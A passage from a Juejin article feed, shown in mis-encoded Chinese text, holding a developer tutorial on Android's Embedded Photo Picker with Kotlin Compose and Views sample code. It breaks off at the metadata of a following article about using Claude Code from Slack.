itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android åµŒå…¥å¼ç…§ç‰‡é€‰æ‹©å™¨ï¼Œè®©ä½“éªŒæ›´åŠ ä¸æ»‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3985057546510423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é»„æ—æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T02:13:30.000Z" title="Wed Jan 28 2026 02:13:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>è®¸å¤šåº”ç”¨ç¨‹åºå¸Œæœ›åœ¨é€‰æ‹©ç…§ç‰‡æˆ–è§†é¢‘æ—¶ä¸ºç”¨æˆ·æä¾›é«˜åº¦é›†æˆå’Œæ— ç¼çš„ä½“éªŒã€‚Embedded Photo Pickerï¼ˆåµŒå…¥å¼ç…§ç‰‡é€‰æ‹©å™¨ï¼‰ä¸ºç”¨æˆ·æä¾›äº†ä¸€ç§æ— ç¼ä¸”æ³¨é‡éšç§çš„æ–¹å¼æ¥é€‰æ‹©ç…§ç‰‡å’Œè§†é¢‘ï¼Œå¹¶ä¸”å°±åœ¨ä½ çš„åº”ç”¨ç•Œé¢å†…ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆéœ€è¦å®˜æ–¹ç…§ç‰‡é€‰æ‹©å™¨ï¼Ÿ</h2>
<h3 data-id="heading-1">ä¼ ç»Ÿæ–¹æ¡ˆçš„ç—›ç‚¹</h3>
<p>è¿‡å»ï¼ŒApp è¦è®©ç”¨æˆ·é€‰æ‹©ç…§ç‰‡ï¼Œé€šå¸¸æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<p><strong>æ–¹å¼ä¸€ï¼šç”³è¯·å­˜å‚¨æƒé™</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// éœ€è¦å£°æ˜å±é™©æƒé™</span>
&lt;uses-permission android:name=<span class="hljs-string">"android.permission.READ_EXTERNAL_STORAGE"</span>/&gt;
&lt;uses-permission android:name=<span class="hljs-string">"android.permission.READ_MEDIA_IMAGES"</span>/&gt;
</code></pre>
<p>é—®é¢˜æ˜¯ï¼šç”¨æˆ·ä¸€æ—¦æˆæƒï¼ŒApp å°±èƒ½è®¿é—®<strong>æ‰€æœ‰ç…§ç‰‡</strong>ã€‚è¿™æ—¢æ˜¯éšç§é£é™©ï¼Œä¹Ÿè®©å¾ˆå¤šç”¨æˆ·ç›´æ¥æ‹’ç»æˆæƒã€‚</p>
<p><strong>æ–¹å¼äºŒï¼šè‡ªå·±å®ç°é€‰æ‹©å™¨</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// è‡ªå»ºé€‰æ‹©å™¨éœ€è¦å¤§é‡ä»£ç </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomPhotoPickerActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-comment">// éœ€è¦å¤„ç†æƒé™ã€åŠ è½½å›¾ç‰‡ã€åˆ†é¡µã€ç¼©ç•¥å›¾ã€å¤šé€‰...</span>
    <span class="hljs-comment">// è¿˜è¦é€‚é…ä¸åŒå‚å•†çš„ç›¸å†Œç»“æ„</span>
    <span class="hljs-comment">// ç»´æŠ¤æˆæœ¬æé«˜</span>
}
</code></pre>
<p>é—®é¢˜æ˜¯ï¼šå¼€å‘æˆæœ¬é«˜ï¼Œç”¨æˆ·ä½“éªŒå‚å·®ä¸é½ï¼Œè€Œä¸”<strong>ä»ç„¶éœ€è¦æƒé™</strong>ã€‚</p>
<h3 data-id="heading-2">å®˜æ–¹æ–¹æ¡ˆçš„ä¼˜åŠ¿</h3>



































<table><thead><tr><th>ç‰¹æ€§</th><th>è‡ªå»ºæ–¹æ¡ˆ</th><th>å®˜æ–¹ Photo Picker</th></tr></thead><tbody><tr><td>éœ€è¦æƒé™</td><td>âœ… å¿…é¡»</td><td>âŒ å®Œå…¨ä¸éœ€è¦</td></tr><tr><td>äº‘ç«¯ç…§ç‰‡</td><td>âŒ ä»…æœ¬åœ°</td><td>âœ… Google Photos</td></tr><tr><td>å¼€å‘æˆæœ¬</td><td>é«˜</td><td>æä½</td></tr><tr><td>ç”¨æˆ·ä¿¡ä»»</td><td>ä½</td><td>é«˜ï¼ˆç³»ç»Ÿçº§UIï¼‰</td></tr><tr><td>å®‰å…¨æ€§</td><td>è‡ªè¡Œä¿è¯</td><td>ç³»ç»Ÿæ²™ç®±ä¿æŠ¤</td></tr></tbody></table>
<p>æ ¸å¿ƒç†å¿µï¼š<strong>App åªèƒ½è®¿é—®ç”¨æˆ·æ˜ç¡®é€‰æ‹©çš„é‚£å‡ å¼ ç…§ç‰‡ï¼Œå…¶ä»–ç…§ç‰‡å®Œå…¨çœ‹ä¸åˆ°ã€‚</strong></p>
<hr/>
<h2 data-id="heading-3">åµŒå…¥å¼ vs æ ‡å‡†ç…§ç‰‡é€‰æ‹©å™¨</h2>
<p>Google å…¶å®æ—©åœ¨ Android 13 å°±æ¨å‡ºäº† Photo Pickerï¼Œä½†é‚£æ˜¯<strong>å¼¹çª—å¼</strong>çš„â€”â€”ç”¨æˆ·ç‚¹å‡»åä¼šè·³è½¬åˆ°ç³»ç»Ÿç•Œé¢é€‰æ‹©ã€‚</p>
<p>æ–°çš„ <strong>Embedded Photo Picker</strong> æ˜¯é©å‘½æ€§çš„å‡çº§ï¼š</p>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ä½ çš„ App ç•Œé¢                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚  æ¶ˆæ¯è¾“å…¥æ¡†...                   â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚  ğŸ“·  ğŸ“·  ğŸ“·    â† åµŒå…¥å¼é€‰æ‹©å™¨    â”‚â”‚
â”‚  â”‚  ğŸ“·  ğŸ“·  ğŸ“·       å°±åœ¨è¿™é‡Œï¼     â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>æ ¸å¿ƒå·®å¼‚ï¼š</strong></p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>æ ‡å‡† Photo Picker</th><th>åµŒå…¥å¼ Photo Picker</th></tr></thead><tbody><tr><td>äº¤äº’æ–¹å¼</td><td>è·³è½¬ç³»ç»Ÿç•Œé¢</td><td>åµŒå…¥ App å†…éƒ¨</td></tr><tr><td>App çŠ¶æ€</td><td>è¿›å…¥åå°æš‚åœ</td><td>ä¿æŒå‰å°æ´»è·ƒ</td></tr><tr><td>é€‰æ‹©ä½“éªŒ</td><td>å•æ¬¡é€‰æ‹©å®Œæˆ</td><td>å¯æŒç»­é€‰æ‹©/å–æ¶ˆ</td></tr><tr><td>UI å®šåˆ¶</td><td>æ— æ³•å®šåˆ¶</td><td>æ”¯æŒä¸»é¢˜è‰²</td></tr><tr><td>å®æ—¶åé¦ˆ</td><td>é€‰å®Œæ‰çŸ¥é“</td><td>å®æ—¶æ›´æ–°</td></tr></tbody></table>
<p>Google Messages å·²ç»é‡‡ç”¨äº†è¿™ä¸ªæ–¹æ¡ˆï¼Œä½“éªŒéå¸¸ä¸æ»‘â€”â€”ç…§ç‰‡é€‰æ‹©å™¨å°±åœ¨è¾“å…¥æ¡†ä¸‹æ–¹ï¼Œé€‰ä¸­çš„ç…§ç‰‡å®æ—¶æ˜¾ç¤ºç¼©ç•¥å›¾ï¼Œå–æ¶ˆé€‰æ‹©åç¼©ç•¥å›¾ç«‹å³æ¶ˆå¤±ã€‚</p>
<hr/>
<h2 data-id="heading-4">å¦‚ä½•æ¥å…¥ï¼Ÿ</h2>
<h3 data-id="heading-5">è®¾å¤‡è¦æ±‚</h3>
<ul>
<li>Android 14ï¼ˆAPI 34ï¼‰æˆ–æ›´é«˜</li>
<li>SDK Extensions ç‰ˆæœ¬ 15+</li>
<li>ä¸æ»¡è¶³æ¡ä»¶çš„è®¾å¤‡è‡ªåŠ¨å›é€€åˆ°æ ‡å‡† Photo Picker</li>
</ul>
<h3 data-id="heading-6">æ·»åŠ ä¾èµ–</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build.gradle.kts</span>

<span class="hljs-comment">// Jetpack Compose é¡¹ç›®ï¼ˆæ¨èï¼‰</span>
implementation(<span class="hljs-string">"androidx.photopicker:photopicker-compose:1.0.0-alpha01"</span>)

<span class="hljs-comment">// ä¼ ç»Ÿ Views é¡¹ç›®</span>
implementation(<span class="hljs-string">"androidx.photopicker:photopicker:1.0.0-alpha01"</span>)
</code></pre>
<h3 data-id="heading-7">Compose å®ç°</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">MessageScreen</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> coroutineScope = rememberCoroutineScope()
    <span class="hljs-keyword">val</span> pickerState = rememberEmbeddedPhotoPickerState()

    <span class="hljs-comment">// å·²é€‰æ‹©çš„ç…§ç‰‡</span>
    <span class="hljs-keyword">var</span> selectedUris <span class="hljs-keyword">by</span> remember { mutableStateOf(emptyList&lt;Uri&gt;()) }

    Column {
        <span class="hljs-comment">// ä½ çš„æ¶ˆæ¯åˆ—è¡¨</span>
        MessageList()

        <span class="hljs-comment">// è¾“å…¥æ¡†</span>
        MessageInput()

        <span class="hljs-comment">// åµŒå…¥å¼ç…§ç‰‡é€‰æ‹©å™¨</span>
        EmbeddedPhotoPicker(
            state = pickerState,
            modifier = Modifier
                .fillMaxWidth()
                .height(<span class="hljs-number">300.</span>dp),
            onUriPermissionGranted = { uris -&gt;
                <span class="hljs-comment">// ç”¨æˆ·é€‰æ‹©äº†æ–°ç…§ç‰‡</span>
                selectedUris = selectedUris + uris
            },
            onUriPermissionRevoked = { uris -&gt;
                <span class="hljs-comment">// ç”¨æˆ·å–æ¶ˆé€‰æ‹©</span>
                selectedUris = selectedUris - uris.toSet()
            },
            onSelectionComplete = {
                <span class="hljs-comment">// ç”¨æˆ·å®Œæˆé€‰æ‹©ï¼ˆå¯é€‰ï¼‰</span>
            }
        )
    }
}
</code></pre>
<h3 data-id="heading-8">è‡ªå®šä¹‰ä¸»é¢˜è‰²</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> featureInfo = EmbeddedPhotoPickerFeatureInfo.Builder()
    .setAccentColor(<span class="hljs-number">0xFF6200EE</span>.toInt())  <span class="hljs-comment">// ä½ çš„å“ç‰Œè‰²</span>
    .build()

EmbeddedPhotoPicker(
    state = pickerState,
    embeddedPhotoPickerFeatureInfo = featureInfo,
    <span class="hljs-comment">// ...</span>
)
</code></pre>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼šä¸»é¢˜è‰²å¿…é¡»å®Œå…¨ä¸é€æ˜ï¼Œäº®åº¦å€¼éœ€åœ¨ 0.05 ~ 0.9 ä¹‹é—´ã€‚</p>
</blockquote>
<h3 data-id="heading-9">Views å®ç°</h3>
<p>å¦‚æœä½ çš„é¡¹ç›®è¿˜åœ¨ç”¨ä¼ ç»Ÿ Viewsï¼š</p>
<p><strong>å¸ƒå±€æ–‡ä»¶ï¼š</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">androidx.photopicker.EmbeddedPhotoPickerView</span>
    <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/photoPicker"</span>
    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"300dp"</span> /&gt;</span>
</code></pre>
<p><strong>Activity ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> picker: EmbeddedPhotoPickerView
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> session: EmbeddedPhotoPickerSession? = <span class="hljs-literal">null</span>

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> listener = <span class="hljs-keyword">object</span> : EmbeddedPhotoPickerStateChangeListener {

        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onSessionOpened</span><span class="hljs-params">(newSession: <span class="hljs-type">EmbeddedPhotoPickerSession</span>)</span></span> {
            session = newSession
        }

        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onUriPermissionGranted</span><span class="hljs-params">(uris: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Uri</span>&gt;)</span></span> {
            <span class="hljs-comment">// å¤„ç†æ–°é€‰æ‹©çš„ç…§ç‰‡</span>
            handleSelectedPhotos(uris)
        }

        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onUriPermissionRevoked</span><span class="hljs-params">(uris: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Uri</span>&gt;)</span></span> {
            <span class="hljs-comment">// å¤„ç†å–æ¶ˆé€‰æ‹©</span>
            removePhotos(uris)
        }

        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onSelectionComplete</span><span class="hljs-params">()</span></span> {
            <span class="hljs-comment">// éšè—é€‰æ‹©å™¨ï¼ˆå¯é€‰ï¼‰</span>
        }

        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onSessionError</span><span class="hljs-params">(throwable: <span class="hljs-type">Throwable</span>)</span></span> {
            <span class="hljs-comment">// é”™è¯¯å¤„ç†</span>
        }
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        picker = findViewById(R.id.photoPicker)
        picker.addEmbeddedPhotoPickerStateChangeListener(listener)
    }
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0da85a4361b4ea1867b7c92466f5075~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6buE5p6X5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770171210&amp;x-signature=ZYFEpZyjUD39jIf1s62WJh%2BUwdk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e572dee31f8e422da2b81954c2178f4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6buE5p6X5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770171210&amp;x-signature=jm5S5wr3sE4SOtD7HQ0jCisdPp4%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-10">é«˜çº§ç”¨æ³•</h2>
<h3 data-id="heading-11">åŒæ­¥å–æ¶ˆé€‰æ‹©çŠ¶æ€</h3>
<p>å½“ç”¨æˆ·åœ¨ä½ çš„ UI ä¸­ç§»é™¤å·²é€‰ç…§ç‰‡æ—¶ï¼Œéœ€è¦é€šçŸ¥é€‰æ‹©å™¨åŒæ­¥çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Compose</span>
coroutineScope.launch {
    pickerState.deselectUris(urisToRemove)
}

<span class="hljs-comment">// Views</span>
session?.requestRevokeUriPermission(urisToRemove)
</code></pre>
<h3 data-id="heading-12">å¤„ç†é…ç½®å˜æ›´</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// å±å¹•æ—‹è½¬æ—¶</span>
session?.notifyConfigurationChanged(newConfig)

<span class="hljs-comment">// å±•å¼€/æ”¶èµ·çŠ¶æ€</span>
session?.notifyPhotoPickerExpanded(isExpanded)

<span class="hljs-comment">// å°ºå¯¸å˜åŒ–</span>
session?.notifyResized(newWidth, newHeight)
</code></pre>
<h3 data-id="heading-13">æ£€æµ‹è®¾å¤‡æ”¯æŒ</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">isEmbeddedPickerAvailable</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> Build.VERSION.SDK_INT &gt;= <span class="hljs-number">34</span> &amp;&amp;
           SdkExtensions.getExtensionVersion(Build.VERSION_CODES.UPSIDE_DOWN_CAKE) &gt;= <span class="hljs-number">15</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-14">æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-15">1. æŠŠé€‰æ‹©å™¨å½“ä½œç‹¬ç«‹å…ƒç´ è®¾è®¡</h3>
<p>ç”±äºå®‰å…¨åŸå› ï¼Œç³»ç»Ÿä¼šé˜»æ­¢ä»»ä½•è¦†ç›–åœ¨é€‰æ‹©å™¨ä¸Šçš„ UI å…ƒç´ ã€‚è®¾è®¡æ—¶è¦æŠŠå®ƒå½“ä½œä¸€ä¸ªã€Œç¥åœ£ä¸å¯ä¾µçŠ¯ã€çš„åŒºåŸŸã€‚</p>
<h3 data-id="heading-16">2. æä¾›å›é€€æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">PhotoPickerWrapper</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">if</span> (isEmbeddedPickerAvailable()) {
        EmbeddedPhotoPicker(<span class="hljs-comment">/* ... */</span>)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å›é€€åˆ°æ ‡å‡† Photo Picker</span>
        StandardPhotoPickerButton(<span class="hljs-comment">/* ... */</span>)
    }
}
</code></pre>
<h3 data-id="heading-17">3. å®æ—¶åé¦ˆç”¨æˆ·é€‰æ‹©</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// åœ¨è¾“å…¥æ¡†ä¸Šæ–¹æ˜¾ç¤ºå·²é€‰ç…§ç‰‡ç¼©ç•¥å›¾</span>
LazyRow {
    items(selectedUris) { uri -&gt;
        AsyncImage(
            model = uri,
            modifier = Modifier
                .size(<span class="hljs-number">60.</span>dp)
                .clickable {
                    <span class="hljs-comment">// ç‚¹å‡»å¯ç§»é™¤</span>
                    coroutineScope.launch {
                        pickerState.deselectUris(listOf(uri))
                    }
                }
        )
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-18">æ€»ç»“</h2>
<p><strong>Embedded Photo Picker çš„æ ¸å¿ƒä»·å€¼ï¼š</strong></p>
<ol>
<li><strong>é›¶æƒé™</strong> â€”â€” å½»åº•å‘Šåˆ«ã€Œè¯·æ±‚è®¿é—®æ‰€æœ‰ç…§ç‰‡ã€</li>
<li><strong>äº‘ç«¯é›†æˆ</strong> â€”â€” ç”¨æˆ·çš„ Google Photos ä¹Ÿèƒ½é€‰</li>
<li><strong>åŸç”Ÿä½“éªŒ</strong> â€”â€” åµŒå…¥ Appï¼Œä¸å†è·³è½¬</li>
<li><strong>å¼€å‘ç®€å•</strong> â€”â€” å‡ è¡Œä»£ç æå®š</li>
</ol>
<p>è¿™ä¸ä»…æ˜¯ API çš„æ›´æ–°ï¼Œæ›´æ˜¯ Android éšç§ä¿æŠ¤ç†å¿µçš„åˆä¸€æ¬¡è¿›åŒ–ã€‚</p>
<hr/>
<p><em>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ç‚¹èµã€åœ¨çœ‹ã€è½¬å‘ä¸‰è¿ï¼æœ‰é—®é¢˜ä¹Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµ ğŸ‘‡</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘æŠŠ Claude Code æ¬è¿›äº† Slackï¼Œä»æ­¤è¹²å‘ä¹Ÿèƒ½ Vibe Coding]]></title>    <link>https://juejin.cn/post/7600223321041158150</link>    <guid>https://juejin.cn/post/7600223321041158150</guid>    <pubDate>2026-01-28T09:31:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600223321041158150" data-draft-id="7599933828544823359" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘æŠŠ Claude Code æ¬è¿›äº† Slackï¼Œä»æ­¤è¹²å‘ä¹Ÿèƒ½ Vibe Coding"/> <meta itemprop="keywords" content="å‰ç«¯,äººå·¥æ™ºèƒ½,Claude"/> <meta itemprop="datePublished" content="2026-01-28T09:31:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åˆ®æ¶‚å±‚_èµ¢å¤§å¥–"/> <meta itemprop="url" content="https://juejin.cn/user/1521379826214119"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘æŠŠ Claude Code æ¬è¿›äº† Slackï¼Œä»æ­¤è¹²å‘ä¹Ÿèƒ½ Vibe Coding
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379826214119/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
